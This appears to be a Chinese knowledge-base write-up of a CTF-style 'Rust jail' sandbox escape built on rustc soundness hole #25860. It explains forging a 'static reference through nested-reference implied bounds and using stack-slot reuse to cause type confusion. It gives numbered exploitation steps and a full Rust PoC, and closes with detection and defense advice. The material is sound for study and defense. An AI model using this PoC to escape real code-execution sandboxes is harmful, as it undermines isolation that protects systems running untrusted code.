---
id: binary-pwn-sandbox-escape-rust-nested-reference-soundness-25860
title: Safe Rust 生命周期 soundness hole
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: rust-nested-reference-implied-bounds
tags:
- rust
- soundness
- lifetime
- type-confusion
- sandbox-escape
- jail
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V126
  verified_at: '2026-11-06T04:11:38+08:00'
  notes: 已对照原文 blazinglyfast 段核对：foo 三参数签名、bad 伪造 'static、never/id 栈槽复用、black_box 调用链与原文 payload 一致；未在目标 rustc 复跑。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-rust-nested-reference-soundness-25860/
draft: false
kb_aliases:
- blazinglyfast
- Rust soundness bug 25860
- nested reference implied bounds
- 伪造 static 引用
- Safe Rust 类型混淆
---

## 一句话结论

Rust jail 要求只用 Safe Rust 把 `In` 返回成 `Out`；利用嵌套引用 + implied bounds 的 soundness hole（#25860），用一个带额外 `&()` 参数的高阶函数签名伪造出指向局部函数指针的 `'static` 引用，再借助栈槽复用把 `never: fn(In)->Out` 替换成 `id: fn(In)->In`，最后按 `fn(In)->Out` 调用，即可把 `In` 的字节原样当作 `Out` 返回。

## 原理

- 旧式 `fn foo<'a,'b,T>(_: &'a &'b (), v: &'b T) -> &'a T { v }` 已被 rustc 拒绝；加入第三个 `&()` 参数后，高阶生命周期推导仍能通过编译：
  `fn foo<'a,'b,T>(_: &'a &'b (), v: &'b T, _: &()) -> &'a T { v }`
- `fn bad<'a,T>(x:&'a T)->&'static T` 把 `foo` 实例化为 `fn(_, &'a T, &()) -> &'static T`，调用后得到一个指向局部变量 `f` 的假 `'static` 引用。
- 该引用实际悬空；随后声明的另一个局部函数指针 `f: fn(In)->In`（`id`）很可能复用同一栈槽，于是假引用指向的内容从 `never` 变成 `id`。
- 把假引用按 `fn(In)->Out` 解引用并调用，实际执行 `id(input)`，返回 `In` 的原始字节；调用点按 `Out` 解释，完成类型混淆。
- 根因是编译器对嵌套引用/implied bounds 的生命周期检查不健全，而不是 unsafe 代码；因此 Safe Rust 代码即可触发。

## 触发条件

- 目标编译并运行用户提交的 Safe Rust 函数体（不允许 `unsafe`、`transmute`）。
- 使用存在 #25860 类 soundness hole 的 rustc 版本。
- `In` 与 `Out` 布局兼容（或至少返回字节可被当作 `Out` 解释），且服务端只校验返回的 `Out` 字段。
- 栈槽复用行为与优化级别允许 `id` 覆盖 `never` 的位置。

## 利用步骤

1. 确认 jail 只接受 Safe Rust 函数体，且返回值被当作 `Out` 校验。
2. 提交 `foo`/`bad` 构造假 `'static` 引用。
3. 先放 `never: fn(In)->Out` 到局部，再 `bad(&f)` 取得假引用。
4. 声明 `id: fn(In)->In` 并取地址，诱导栈槽复用覆盖 `never`。
5. 解引用假引用为 `fn(In)->Out`，调用 `g(input)`，返回 `In` 字节冒充 `Out`。

## PoC

```rust
fn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T, _: &()) -> &'a T { v }
static UNIT: &'static &'static () = &&();

fn bad<'a, T>(x: &'a T) -> &'static T {
    let f: fn(_, &'a T, &()) -> &'static T = foo;
    f(UNIT, x, &())
}

fn never(_: In) -> Out { loop {} }
fn id(x: In) -> In { x }

let rf = {
    let f: fn(In) -> Out = core::hint::black_box(never as fn(In) -> Out);
    core::hint::black_box(bad(&f))
};

let f: fn(In) -> In = core::hint::black_box(id as fn(In) -> In);
core::hint::black_box(&f);

let g: fn(In) -> Out = *core::hint::black_box(rf);
g(input)
```

## 变体与关联

- 其他 Rust soundness hole（如 `transmute` 替代、`MaybeUninit` 误用）可用于同类类型混淆。
- 若栈槽不复用，可调整优化级别/插入 `black_box` 或改变局部变量顺序。
- 关联：[[binary-pwn-sandbox-escape-python-eval-filter-bypass]]（语言级沙箱逃逸）、[[binary-pwn-sandbox-escape-graalvm-explicit-info-leak]]（运行时沙箱逃逸）。

## 检测与防御

- 使用已修复/最新 rustc，并用 Miri 检查提交代码的未定义行为。
- 不要编译运行不可信 Rust 源码；使用进程级隔离与资源限制。
- 检测：提交代码中出现嵌套引用 + `'static` 返回、`black_box`、函数指针栈槽复用模式。
